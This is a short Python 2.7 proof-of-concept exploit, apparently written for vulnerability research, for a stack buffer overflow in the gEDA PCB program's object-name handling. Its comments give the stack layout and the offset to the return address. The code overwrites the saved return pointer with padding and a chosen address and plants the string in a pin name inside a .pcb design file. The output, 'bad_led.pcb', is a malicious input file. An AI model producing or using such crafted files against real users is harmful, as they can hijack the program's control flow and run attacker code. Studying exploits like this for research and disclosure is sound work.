#!/usr/bin/env python2.7

import struct
import sys

#build proof of concept stack overflow exploit for gEDA PCB software 
#(currently proof of concept with FORTIFY_SOURCE disable, stack protection disable, ASLR disable)

#this is a buffer > stack based overflow executed in change.c:2458, function QueryInputAndChangeObjectName

#stack layout: (this addresses will change but offsets will not)
#msg is 513 bites msg base pointer at 0x7ffe467be9d0
#  rbx at 0x7ffe467bebe8, rbp at 0x7ffe467bebf0, r12 at 0x7ffe467bebf8,
#  r13 at 0x7ffe467bec00, r14 at 0x7ffe467bec08, r15 at 0x7ffe467bec10,
#  rip at 0x7ffe467bec18
#584 bytes between base of msg and rip 
#exit at 0x7ffff4df9030 ? 0x7ffff51844c0

#buffer_base_addr = 0x7fffffffcfd0
#buffer_base_addr = 0x1111111111111111
buffer_base_addr = 0x7ffff51844c0
buffer_to_rip_offset = 592
#buffer_to_rip_offset = 650


def build_exploit_file(exploit):
	#open .pcb file to add payload to
	payload_file = open('LED.pcb', 'r')
	file_contents = payload_file.readlines()
	payload_file.close()
	#hard coded line chosen 
	file_contents[1363] = "Pin(0 -300 60 30 90 28 \"GND\" \"" + exploit + "\" 0x00000001)\n"
	#write back to file 
	with open('bad_led.pcb', 'w') as file:
		file.writelines( file_contents )

def build_exploit(shellcode):
	len_shellcode = len(shellcode)
	base_address = struct.pack('<Q', buffer_base_addr)
	exploit_string = 'a'*(buffer_to_rip_offset-len_shellcode)+base_address
	return exploit_string 

#load shellcode 
#shellcode = open("shellcode.bin", 'rb').read()
shellcode = struct.pack('<Q', 0x111111111111)
exploit = build_exploit(shellcode)
build_exploit_file(exploit)







